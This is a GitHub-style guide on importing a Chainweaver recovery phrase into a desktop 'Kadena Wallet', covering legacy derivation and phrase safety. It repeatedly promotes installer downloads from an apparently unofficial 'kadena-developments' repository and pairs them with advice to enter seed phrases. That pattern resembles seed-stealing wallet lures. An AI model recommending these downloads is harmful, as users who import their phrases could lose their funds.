![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Importing a Chainweaver Seed into Kadena Wallet</h1>

<p align="center">A Kadena Wallet guide to keys, backups and devices.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Chainweaver stopped being maintained in January 2026, and thousands of KDA holders still have a twelve-word phrase that was generated inside it. Importing that phrase correctly is a different problem from importing an ordinary BIP39 wallet, because Chainweaver derived keys its own way.

Get the derivation wrong and everything still appears to work: the wallet accepts your words, shows a valid `k:` address, and a balance of zero. That is the failure mode to watch for.

## You'll see this if

- You have a twelve-word phrase from Chainweaver and no working Chainweaver install.
- You imported the phrase somewhere and the balance came up empty.
- You are not sure whether your phrase is a Chainweaver phrase or an eckoWALLET phrase.
- You want to move funds out before the old software stops running on your machine.

## Why Chainweaver phrases are awkward

Chainweaver used the standard BIP39 English wordlist, so its phrases look ordinary. What differs is what it did with them.

Kadena's legacy derivation treats the twelve words as a master seed and derives Ed25519 key pairs from it in its own way, rather than walking a plain BIP44 path. The practical result is that software built around standard BIP44 derivation will read the same words and produce a different set of keys.

Kadena's command-line tooling acknowledged this for years with a `--legacy` flag on wallet import. That flag exists precisely because "import this phrase" was ambiguous.

## How to tell what you have

Before importing, establish three facts:

| Question | Why it matters |
| --- | --- |
| How many words? | 12 words is characteristic of Chainweaver and eckoWALLET; 24 is typical of Koala and many hardware flows. |
| Do you know the original address? | It is the only reliable test of a successful import. |
| Did the phrase ever live in a browser extension? | eckoWALLET generates 12-word phrases on a standard path, and some users moved Chainweaver seeds into it. |

If you still have the old address, write it down before you start. It is your checksum.

## The correct import sequence

Labels differ between wallets; the order below is what matters.

1. **Choose import from an existing recovery phrase,** not create new. Choosing create will generate a fresh key and leave your old funds unreachable from that install.
2. **Enter the twelve words in order,** lowercase, with single spaces. Extra words or a stray capital can change the result.
3. **Select the legacy or Chainweaver derivation option if the wallet offers one.** This is the step that most people miss, and it is the whole difference between a working import and an empty one.
4. **Compare the first derived address to the address you wrote down.** Character by character, at least the first eight and last eight.
5. **Check the balance on each chain you used,** not just the one the wallet opens on. Chainweb keeps state per chain.
6. **Send a small test transaction out** to a destination you control before you consolidate anything.

If the address matches and the balance is there, the import is done. If the address matches but the balance is zero, check other chains before concluding anything.

## If the balance is empty but the address is right

That combination is not a derivation failure; it is a chain or account problem.

1. Switch chains 0 through 19 and look for the balance on each.
2. Confirm you are on mainnet, not a testnet.
3. Check the address in a community explorer rather than in the wallet, to separate display bugs from real state.
4. If the explorer shows a balance the wallet does not, the wallet's indexer is the problem, not your keys.

## If the address is different from the old one

Then the derivation is wrong, and the phrase is probably fine.

1. Look for a legacy, Chainweaver, or advanced derivation toggle in the import flow.
2. Try importing into a wallet that documents Chainweaver support explicitly. Several do; eckoWALLET's own listing states it can regenerate accounts from Chainweaver seeds.
3. As a fallback, use Kadena's command-line tooling with the legacy flag, which prints derived addresses without needing a graphical interface.
4. Do not create a new account and send funds into it hoping the old one reappears. Derivation is deterministic: the same phrase and scheme always give the same keys.

## What Chainweaver's shutdown does and does not change

The repository was archived read-only on 9 January 2026, and the last release was 2.2.3. Archived means no new commits, not deleted: existing installers remain downloadable, and the code can still be inspected.

Two practical consequences:

- **Your accounts are unaffected.** Keys and balances live on-chain. The software going quiet does not touch them.
- **Your ability to sign with that specific app is at risk over time.** Old desktop builds depend on endpoints that have moved; the company API host no longer answers, so a Chainweaver install that tries to talk to it may fail even though the chain is fine.

That is the argument for importing now rather than when you need the funds.

## Safety rules for this specific job

- Never type the phrase into a web page that offers to "check" it. The only safe place for a recovery phrase is the wallet's own import screen.
- Do not paste it into a search engine, a chat, or a support ticket. No support process needs it.
- If a page asks you to "migrate" KDA from Chainweaver, close it. There is no migration; the chain and the token never changed.
- Keep the old phrase even after a successful import. Two copies in two offline places is the standard, not paranoia.

## A note on older guides

Guides written before late 2025 will tell you to open Chainweaver, choose a chain, and use its built-in transfer flow. Some of those steps still work; the endpoints they rely on may not. If a guide's screenshots show the old interface and its instructions include the old API host, treat the whole page as historical and use it only for the parts that describe key derivation.

## FAQ

**Can I import a Chainweaver phrase into any Kadena wallet?**
Only into one that supports the legacy derivation, either automatically or through an option. Standard BIP44 imports will accept the words and derive different keys.

**Will importing create a duplicate account?**
No. The account already exists on-chain; importing gives you signing access to it, not a copy.

**What if I only have the address and not the phrase?**
Then you cannot move the funds. An address is public information; it carries no signing ability.

**Is the twelve-word format weak?**
Twelve BIP39 words carry 128 bits of entropy, which is standard and not the weak point. The weak point is storage, not length.

**Does the old password matter?**
Chainweaver's local password encrypted its keystore file. If you are importing the phrase into a different wallet, that password is irrelevant; the phrase is what counts.

## Related reading

- How to create a KDA account in Kadena Wallet
- Migrating from Koala Wallet after KDA removal
- Ledger not showing a KDA balance
- Cross-chain transfers in Kadena Wallet

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [eckoWALLET to Kadena Wallet: What Carries Over](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/eckowallet-to-kadena-wallet-migration.md)
- [Migrating from Koala to Kadena Wallet After KDA Removal](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/migrating-from-koala-after-kadena-removal.md)
- [Moving from Linx to Kadena Wallet: Seeds and Accounts](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/linx-to-kadena-wallet-migration.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
